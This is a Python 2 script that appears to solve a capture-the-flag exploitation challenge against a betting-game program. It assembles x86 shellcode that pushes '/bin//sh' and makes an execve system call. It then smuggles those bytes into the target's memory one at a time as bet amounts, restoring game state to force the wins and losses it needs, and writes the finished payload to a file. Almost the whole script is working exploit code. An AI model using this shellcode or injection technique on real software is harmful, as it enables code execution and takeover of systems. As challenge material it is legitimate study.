#!/usr/bin/python

import sys
sys.path.insert(0, '/home/benoit/opt32/lib/python2.7/site-packages')
print sys.path
import binascii
import chdrft.utils as utils
import time
import os
import itertools as it
import pickle

os.environ['LD_PRELOAD'] = ''


DIFF = (0, 51, 9)


def getShellcode(tb):
    return [(x, utils.getDisassembly([x])) for x in tb]


def getShellcode1():
    jmp = 6
    tb1 = [
        'jmp short %d' % (jmp+DIFF[0]),
        # h0
        'mov eax, [esp]',
        'ret',
    ]
    return getShellcode(tb1)


def getShellcode2():
    tb2 = [
        'xor eax, eax',
        'push eax',
        'push 068732f2fh',
        'push 06e69622fh',
        'mov ebx, esp',
        'push eax',
        'mov edx, esp',
        'push ebx',
    ]
    return getShellcode(tb2)


def getShellcode3():

    tmp = getShellcode1()
    tmp.extend(getShellcode2())

    x = 0#call length
    for i in tmp[1:]:
        x += len(i[1])
    diff0 = 0x10+1

    tb = [
        'call -%d' % (x+DIFF[1]),
        'mov cl, -1h',
        'sub [eax+%d], cl' % (diff0+DIFF[2]),
        'xor eax, eax',
        'mov al, 0bh',
        'mov ecx, esp',
        'int 7fh',
    ]
    return getShellcode(tb)


def getPossibilities():
    state = xx.backupState()

    bet = 1
    ans = {}
    win, maxHit, askTip, dummy = xx.doRound(bet, -1, 0)
    xx.restoreState(state)
    for i in range(maxHit+1):
        win, maxHit, askTip, dummy = xx.doRound(bet, i, 0)
        xx.restoreState(state)
        ans[win] = i

    xx.releaseState(state)

    return ans


class Solver:

    def __init__(self, x):
        self.x = x
        self.money = 100
        self.numBets = 0

        self.lossIns = 3
        self.winnings = []
        self.winIns = map(ord, utils.getDisassembly(['push eax', 'pop eax']))

    def checkState(self):
        state = self.x.getState()
        print state[0], state[1], "VS", self.money, self.numBets
        assert state[0] == self.money
        assert state[1] == self.numBets

    def saveState(self):
        state = self.x.backupState()
        return (state, self.money, self.numBets, list(self.winnings))

    def restoreState(self, s):
        self.x.restoreState(s[0])
        self.money, self.numBets, self.winnings = s[1:]
        self.x.releaseState(s[0])

    def executeRound(self, bet, val, tip, mark=None):
        win, dummy, askTip, stand = self.x.doRound(bet, val, tip)
        y = bet*win

        if mark is not None:
            mark = dict(mark)
        self.winnings.append({'bet': y,
                              'numHit': val,
                              'askTip': askTip,
                              'stand': stand,
                              'mark': mark,
                              'money': self.money,
                              'numBets': self.numBets,
                              'win': win})
        self.money += y
        if win != 0:
            self.numBets += 1

    def getWin(self, bet, strict=True, mark=None):
        s = self.x.backupState()
        while True:
            can = getPossibilities()
            if 1 in can:
                self.executeRound(bet, can[1], 0, mark)
                return True
            elif 0 in can:
                self.executeRound(bet, can[0], 0)
            else:
                if strict:
                    return False
                self.executeRound(self.lossIns, can[-1], 0)

    def getLoss(self, bet, mark=None):
        # strict here
        while True:
            can = getPossibilities()
            if -1 in can:
                self.executeRound(bet, can[-1], 0, mark)
                return True
            elif 0 in can:
                self.executeRound(bet, can[0], 0)
            else:
                return False

    def getWhatever(self):
        can = getPossibilities()
        if 1 in can:
            self.executeRound(self.winIns[0], can[1], 0)
            self.getWin(self.winIns[1], strict=False)
        elif 0 in can:
            self.executeRound(1, can[0], 0)
        else:
            self.executeRound(self.lossIns, can[-1], 0)

    def getMoney(self):
        while self.money < 1000:
            self.getWhatever()
            self.checkState()

    def doSequence(self, seq, mark):
        mark['op'] = seq[0]
        for pos, c in enumerate(seq[1]):
            y = ord(c)

            mark['char'] = y
            mark['len'] += 1
            if pos == 1:
                mark.pop('op')

            if y <= 0x7f:
                if not self.getWin(y, mark=mark, strict=True):
                    return False
            else:
                if not self.getLoss(0x100-y, mark=mark):
                    pass
        return True

    def doSequenceWithRetry(self, seq, mark):
        while True:
            self.getMoney()
            s = self.saveState()
            tmp = dict(mark)
            if self.doSequence(seq, tmp):
                mark.clear()
                mark.update(tmp)
                break
            self.restoreState(s)

            self.getWhatever()
        mark['opnum'] += 1

    def getNumAdditionalBytes(self, l, r):
        start = False
        cnt = 0
        for x in self.winnings:
            if x['win']==0:
                continue
            mark = x['mark']
            if not start:
                if mark is not None and l(mark):
                    start = True
            else:
                if mark is None:
                    cnt += 1
                elif r(mark):
                    break
        return cnt
    def getEffectiveShellcode(self):
        x = ''
        for i in self.winnings:
            c = i['bet']
            if i['win']==0:
                continue
            if c < 0:
                c = 0x100+c
            x += chr(c)
        return x

    def getAssembly(self):
        return utils.getAssembly(self.getEffectiveShellcode())

    def playToMoney(self, val):
        while self.money != val:
            diff = val-self.money

            can = getPossibilities()
            target = 1

            if diff < 0:
                target = -1

            diff = min(abs(diff), 0x7f)
            if not target in can:
                self.executeRound(0, 0, 0)
            else:
                self.executeRound(diff, can[target], 0)


    def solve(self, name):
        xx.initState(name)
        tb1 = getShellcode1()
        tb2 = getShellcode2()
        tb3 = getShellcode3()
        l = 0
        h = {'len': 0}

        h['type'] = 1
        h['opnum'] = 0

        for x in tb1:
            self.doSequenceWithRetry(x, h)
            l += len(x)

        h['type'] = 2
        h['opnum'] = 0
        for x in tb2:
            self.doSequenceWithRetry(x, h)
            l += len(x)

        h['type'] = 3
        h['opnum'] = 0
        for x in tb3:
            self.doSequenceWithRetry(x, h)
            l += len(x)
        self.playToMoney(0x539)

        for x in self.winnings:
            print x

        d1L = lambda x: x['type'] == 1 and x['opnum'] == 0
        d1R = lambda x: x['type'] == 2 and x['opnum'] == 0

        d2L = lambda x: x['type'] == 1 and x['opnum'] == 1
        d2R = lambda x: x['type'] == 3 and x['opnum'] == 0

        d3L = lambda x: x['type'] == 3 and x['opnum'] == 2
        d3R = lambda x: x['type'] == 3 and x['opnum'] == 6

        d1 = self.getNumAdditionalBytes(d1L, d1R)
        d2 = self.getNumAdditionalBytes(d2L, d2R)
        d3 = self.getNumAdditionalBytes(d3L, d3R)
        print "diff >> ", d1, d2, d3
        assert (d1, d2, d3) == DIFF
        print ":assembly >> "

        print self.getAssembly()
        data = {'name': name, 'seq': self.winnings}
        pickle.dump(data, open('dump_seq.txt', 'wb'))
        with open('res_shellcode', 'wb') as fx:
            fx.write(self.getEffectiveShellcode())



#print getShellcode1()
#print getShellcode2()
#print getShellcode3()
#sys.exit(0)
import xx

name = 'bxcd'
solver = Solver(xx)
solver.solve(name)
print "Ddone"

